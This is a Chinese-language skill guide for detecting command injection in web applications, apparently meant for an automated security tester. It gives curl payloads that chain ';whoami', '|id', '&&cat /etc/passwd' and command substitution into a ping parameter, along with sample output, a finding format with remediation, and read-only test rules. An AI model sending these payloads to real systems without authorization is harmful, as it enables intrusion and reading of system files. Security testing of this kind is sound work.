# 命令注入漏洞检测技能

## 原理

命令注入发生在 Web 应用将用户输入未过滤直接拼接到系统命令中时，攻击者可执行任意系统命令。

**常见成因**：
- 用户输入直接拼接 shell 命令（`ping {user_input}`）
- 未过滤特殊字符（`;` `|` `&&` `$()` 反引号）
- 使用 `system()` `exec()` `popen()` 等危险函数

**常见场景**：
- 网络诊断功能（ping/traceroute/nslookup）
- 文件操作功能（压缩/解压/转换）
- 系统管理接口（重启服务/查看日志）

## 检测方法

### 1. 定位注入点
- Ping 功能：`/api/ping?host=127.0.0.1`
- DNS 查询：`/api/nslookup?domain=example.com`
- 文件转换：`/api/convert?file=test.pdf`

### 2. 构造命令拼接 Payload

**Payload 1 — 分号分隔**:
```bash
curl "http://target/api/ping?host=127.0.0.1;whoami"
```

**Payload 2 — 管道符**:
```bash
curl "http://target/api/ping?host=127.0.0.1|id"
```

**Payload 3 — && 逻辑与**:
```bash
curl "http://target/api/ping?host=127.0.0.1%26%26cat%20/etc/passwd"
```

**Payload 4 — 命令替换**:
```bash
curl "http://target/api/ping?host=\$(hostname)"
curl "http://target/api/ping?host=\`hostname\`"
```

### 3. 验证命令执行

**判断依据**：
- 响应包含 `uid=` → `id` 命令被执行
- 响应包含主机名 → `hostname` 命令被执行
- 响应包含 `/etc/passwd` 内容 → `cat` 命令被执行

**示例响应**：
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.042 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 工具

| 工具 | 用途 |
|---|---|
| curl | 命令行测试注入 |
| Burp Suite | 抓包修改参数 |
| Commix | 自动化命令注入工具 |

## 输出格式

```json
{
  "finding_id": "command-injection-001",
  "issue_type": "command-injection",
  "severity": "critical",
  "endpoint": "/api/ping",
  "parameter": "host",
  "payload": "127.0.0.1;whoami",
  "evidence": "响应包含 uid=33(www-data)",
  "remediation": "使用参数化命令（subprocess list 形式），过滤特殊字符"
}
```

## 注意事项

- **只读原则**：仅检测，不执行危险命令（如删除系统文件）
- **无害 Payload**：使用 `whoami` `id` `hostname` 验证
- **零触网**：测试用 mock 或本地环境
